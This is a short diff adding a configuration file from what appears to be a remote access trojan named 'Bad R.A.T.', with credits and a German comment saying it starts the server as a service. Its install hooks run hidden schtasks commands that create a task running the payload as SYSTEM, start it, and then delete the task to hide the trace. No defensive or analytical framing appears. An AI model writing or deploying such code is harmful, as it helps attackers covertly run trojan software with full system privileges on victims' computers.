@@ -1,0 +1,9 @@
+;Event Setting [Bad R.A.T.]
+;by Mr Hawk
+;THX to heroin
+
+; startet Server als Service
+
+OnInstallation: StartPath_Hide schtasks /create /tn aitsch /tr "[%APP]" /sc EINMAL /st 00:00:00 /ru "SYSTEM" >NUL
+OnInstallation: StartPath_Hide schtasks /run /tn aitsch >NUL
+OnInstallation: StartPath_Hide schtasks /delete /tn aitsch /f >NUL
